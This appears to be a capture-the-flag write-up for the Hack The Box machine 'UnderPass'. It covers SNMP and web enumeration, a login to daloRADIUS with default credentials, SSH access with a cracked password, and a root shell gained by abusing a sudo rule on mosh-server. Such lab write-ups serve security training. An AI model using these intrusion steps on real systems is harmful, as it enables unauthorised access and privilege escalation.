---
layout: post
title: "UnderPass"
description: "UnderPass is an Easy rated Linux machine on HTB."
categories: [CTF,HTB]
tags: [Linux,Easy]
author: g
---

## Nmap Scan
```bash
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.36s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

UDP:
```bash
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.019s latency).

PORT    STATE SERVICE
161/udp open  snmp
```

### Enumerate SNMP (Port 161)
We can use snmpbulkwalk to enumerate the following interesting info:
```bash
snmpbulkwalk -c public -v2c 10.10.11.48 .

steve@underpass.htb
UnDerPass.htb is the only daloradius server in the basin!
```

Modify hosts file:
```bash
tail -n 1 /etc/hosts
10.10.11.48 underpass.htb
```

### Enumerate HTTP (Port 80)
Landing page is running the default ubuntu page. Found no subdomains or files using feroxbuster & ffuf. After running out of ideas I started researching `daloradius` since this was the only interesting result from SNMP:
![Pasted image 20250119121845.png](/images/Pasted image 20250119121845.png){: .normal }

We get a forbidden error, let's try to run feroxbuster on this directory:
```bash
feroxbuster -u http://10.10.11.48/daloradius/ -x php,html,pdf,txt                                                 
200      GET      112l      352w     4421c http://10.10.11.48/daloradius/app/users/login.php
```

Login page:
![Pasted image 20250119122018.png](/images/Pasted image 20250119122018.png){: .normal }

There is a login page for the operators. We can authenticate using default creds (administrator:radius): [Link](https://github.com/lirantal/daloradius/blob/master/doc/install/INSTALL.debian.md).
![Pasted image 20250119130230.png](/images/Pasted image 20250119130230.png){: .normal }

Found database password on the website:
![Pasted image 20250119130440.png](/images/Pasted image 20250119130440.png){: .normal }

Found a user:
![Pasted image 20250119132036.png](/images/Pasted image 20250119132036.png){: .normal }
> Password hash cracks to: `underwaterfriends` using crackstation.
{: .prompt-info }

We can SSH as this user:
```bash
ssh svcMosh@underpass.htb
--SNIP--
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
```

User.txt: `44aaaed3a1f3318ac9223250f07c6d0c`
```bash
svcMosh@underpass:~$ cat user.txt 
44aaaed3a1f3318ac9223250f07c6d0c
```

### Privilege Escalation
Sudo -l output:
```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

Whenever we start a mosh server using the /usr/bin/mosh-server command we don't automatically authenticate. Instead what we can do is use the mosh command and specify the --server flag. Since we can run mosh-server as sudo we are able to automatically connect to a privileged instance: [Link](https://mosh.org/#usage)
```bash
svcMosh@underpass:~$ mosh --help
--SNIP--
        --server=COMMAND     mosh server on remote machine
							 (default: "mosh-server")
--SNIP--
```

We can run the following command to connect to a privileged mosh server:
```bash
mosh --server="sudo /usr/bin/mosh-server" localhost
```

Shell as root:
```bash
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Proof of exploitation:
![Pasted image 20250119133309.png](/images/Pasted image 20250119133309.png){: .normal }


### PWNED!!!
![Pasted image 20250119133331.png](/images/Pasted image 20250119133331.png){: .normal }